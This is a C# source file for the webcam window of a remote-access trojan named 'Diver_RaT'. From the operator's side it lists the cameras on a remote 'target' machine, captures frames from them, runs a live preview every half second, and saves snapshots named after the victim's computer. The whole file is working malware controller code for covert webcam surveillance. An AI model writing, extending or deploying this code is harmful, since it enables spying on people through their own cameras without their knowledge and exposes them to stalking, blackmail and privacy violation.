using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text.Json;
using System.Windows;
using System.Windows.Threading;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class WebcamWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly DispatcherTimer _previewTimer;
        private bool _capturing;
        private int _consecutiveErrors;

        public WebcamWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Webcam - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            _previewTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(500) };
            _previewTimer.Tick += (_, _) => _ = RefreshFrame();

            _ = LoadCameras();
        }

        private async System.Threading.Tasks.Task LoadCameras()
        {
            StatusText.Text = "Detecting cameras...";
            var result = await _server.SendCommandAsync(_device.Id, "LIST_CAMS", timeoutMs: 15000);
            if (!result.Success)
            {
                StatusText.Text = $"Could not detect cameras: {result.Error}";
                return;
            }

            var items = new List<CameraItem>();
            try
            {
                using var doc = JsonDocument.Parse(result.Result ?? "[]");
                foreach (var e in doc.RootElement.EnumerateArray())
                {
                    items.Add(new CameraItem
                    {
                        Index = e.TryGetProperty("index", out var i) ? i.GetInt32() : 0,
                        Name = e.TryGetProperty("name", out var n) ? n.GetString() ?? "" : ""
                    });
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Invalid camera list: {ex.Message}";
                return;
            }

            if (items.Count == 0)
            {
                StatusText.Text = "No camera device found on the target.";
                return;
            }

            CamCombo.IsEnabled = true;
            CamCombo.ItemsSource = items;
            CamCombo.SelectedIndex = 0;
            StatusText.Text = $"Detected {items.Count} camera(s). Press Capture Frame or enable Live Preview.";
        }

        private async void CaptureButton_Click(object sender, RoutedEventArgs e)
        {
            if (_capturing) return;
            await RefreshFrame();
        }

        private async System.Threading.Tasks.Task RefreshFrame()
        {
            if (_capturing) return;
            _capturing = true;
            try
            {
                StatusText.Text = "Capturing...";
                var args = CamCombo.SelectedItem is CameraItem cam
                    ? new Dictionary<string, string> { ["index"] = cam.Index.ToString() }
                    : null;
                var result = await _server.SendCommandAsync(_device.Id, "WEBCAM", args, timeoutMs: 20000);
                if (result.Success && !string.IsNullOrEmpty(result.Result))
                {
                    CamImage.Source = ImageHelper.FromBase64(result.Result);
                    SaveButton.IsEnabled = true;
                    Placeholder.Visibility = Visibility.Collapsed;
                    _consecutiveErrors = 0;
                    StatusText.Text = LiveCheck.IsChecked == true
                        ? $"Live preview running. Last: {DateTime.Now:HH:mm:ss}"
                        : $"Captured {DateTime.Now:HH:mm:ss}";
                }
                else
                {
                    _consecutiveErrors++;
                    StatusText.Text = $"Capture failed: {result.Error}";
                    if (LiveCheck.IsChecked == true && _consecutiveErrors >= 3)
                    {
                        LiveCheck.IsChecked = false;
                        StatusText.Text = $"Live preview stopped after repeated failures: {result.Error}";
                    }
                }
            }
            catch (Exception ex)
            {
                _consecutiveErrors++;
                StatusText.Text = $"Capture failed: {ex.Message}";
            }
            finally
            {
                _capturing = false;
            }
        }

        private async void CamCombo_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            if (LiveCheck.IsChecked == true) await RefreshFrame();
        }

        private void LiveCheck_Changed(object sender, RoutedEventArgs e)
        {
            if (LiveCheck.IsChecked == true)
            {
                _consecutiveErrors = 0;
                _previewTimer.Start();
            }
            else
            {
                _previewTimer.Stop();
                StatusText.Text = "Live preview paused";
            }
        }

        private void Window_Closing(object? sender, CancelEventArgs e) => _previewTimer.Stop();

        private void SaveButton_Click(object sender, RoutedEventArgs e)
        {
            if (CamImage.Source is not System.Windows.Media.Imaging.BitmapSource bmp) return;
            var dlg = new SaveFileDialog
            {
                FileName = $"webcam_{_device.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg",
                Filter = "JPEG image|*.jpg"
            };
            if (dlg.ShowDialog(this) != true) return;

            var encoder = new System.Windows.Media.Imaging.JpegBitmapEncoder { QualityLevel = 90 };
            encoder.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(bmp));
            using var fs = System.IO.File.Create(dlg.FileName);
            encoder.Save(fs);
            StatusText.Text = $"Saved to {dlg.FileName}";
        }
    }

    public class CameraItem
    {
        public int Index { get; set; }
        public string Name { get; set; } = "";
        public override string ToString() => $"{Index + 1}. {Name}";
    }
}
